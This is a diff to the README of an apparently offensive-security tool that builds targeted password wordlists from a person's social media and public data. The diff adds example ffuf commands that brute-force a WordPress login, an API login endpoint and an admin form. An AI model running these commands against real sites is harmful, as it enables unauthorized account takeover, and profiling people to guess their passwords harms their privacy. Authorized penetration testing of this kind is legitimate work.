@@ -60,7 +60,7 @@ Rename `config.example.json` to `config.json`. Customize:
 
 **General Sources:**
 
-- **Social Media** - Facebook, LinkedIn, Instagram, Twitter/X
+- **Social Media** - [Facebook](https://facebook.com), [LinkedIn](https://linkedin.com), [Instagram](https://instagram.com), [Twitter/X](https://x.com)
 - **Google Search** - "name + city" or "name + company"
 - **Public Directories** - Phone numbers, addresses
 
@@ -101,8 +101,7 @@ https://target.com/author/username
 
 **Common WordPress Usernames:**
 
-- `admin`, `administrator`, `root`
-- `wp-admin`, `webmaster`, `user`
+- `admin`, `root`, `test`, `user`
 - Site name variations
 - Author names from posts/pages
 
@@ -112,6 +111,26 @@ https://target.com/author/username
 2. Add info to `config.json` e.g. under `personal_info` or `custom`.
 3. Run: `python main.py`
 4. Generated passwords saved to specified output file
+
+## Example Usage with ffuf
+
+**WordPress Login Brute Force:**
+
+```bash
+ffuf -w wordlist.txt -u https://target.com/wp-login.php -X POST -d "log=admin&pwd=FUZZ&wp-submit=Log+In" -H "User-Agent: Mozilla/5.0 (compatible; Bug Bounty Research)" -mc 200 -fs 1234
+```
+
+**API Endpoint Testing:**
+
+```bash
+ffuf -w wordlist.txt -u https://api.target.com/login -X POST -d '{"username":"admin","password":"FUZZ"}' -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (compatible; Security Research)" -mc 200,201
+```
+
+**Custom Headers for Bug Bounty:**
+
+```bash
+ffuf -w wordlist.txt -u https://target.com/admin -X POST -d "password=FUZZ" -H "X-Bug-Bounty: xxxxx" -mc 200,302
+```
 
 ## Use Cases
 
